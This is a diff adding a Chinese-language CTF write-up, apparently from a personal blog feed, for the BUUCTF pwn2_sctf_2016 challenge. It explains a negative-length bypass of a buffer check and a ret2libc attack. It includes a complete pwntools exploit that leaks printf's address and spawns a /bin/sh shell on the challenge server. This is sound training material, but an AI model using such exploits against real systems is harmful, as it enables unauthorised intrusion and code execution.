@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BUUCTF-PWN-pwn2_sctf_2016</title>
+      <link href="/20220202-ctf-pwn2/"/>
+      <url>/20220202-ctf-pwn2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-pwn2-sctf-2016"><a href="#BUUCTF-PWN-pwn2-sctf-2016" class="headerlink" title="BUUCTF-PWN-pwn2_sctf_2016"></a>BUUCTF-PWN-pwn2_sctf_2016</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202021651206.png" alt="image-20220202165135431"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202021652482.png" alt="image-20220202165232296"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202021652914.png" alt="image-20220202165251398"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202021653983.png" alt="image-20220202165317446"></p><p><code>get_n</code>函数会向指针（参数1），存入一定长度（参数2）的字符串。</p><p><code>vuln</code>函数第7行，表示读入长度为4的字符串；</p><p>第8行表示将刚才读入的字符串转化为<code>int</code>型数字；</p><p>第9行的<code>if</code>条件限制了读入长度不能大于32，而<code>nptr</code>指向的合法空间有32，所以无法直接溢出，但是我们可以考虑输入负数，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202021705619.png" alt="image-20220202170500616"></p><p>这样我们的写入空间就足够用了。</p><p>下面就是ret2libc的问题，可以利用<code>printf</code>函数打印出<code>printf_got</code>的地址，用来计算偏移</p><p><code>libc</code>文件可以利用buuoj给出的<a href="https://files.buuoj.cn/files/85ee93d92fc553f78f195a133690eef3/libc-2.23.so">https://files.buuoj.cn/files/85ee93d92fc553f78f195a133690eef3/libc-2.23.so</a></p><p>PS：很多师傅的WP都用了LibcSearcher，但它现在可能用起来会有问题（实操无法解出该题），也没有直接用官方给出的libc方便</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26336</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../libc/ubuntu16/32/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;read? &#x27;</span>, <span class="string">&#x27;-999&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2C</span> + <span class="number">0x4</span>) + p32(printf_plt) + p32(main_addr) + p32(printf_got)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data!\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr: &#x27;</span>, <span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>.encode()))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2C</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;read? &#x27;</span>, <span class="string">&#x27;-999&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202021713219.png" alt="image-20220202171328770"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUUCTF-PWN-jarvisoj_fm</title>
       <link href="/20220201-ctf-jarvisoj_fm/"/>
       <url>/20220201-ctf-jarvisoj_fm/</url>
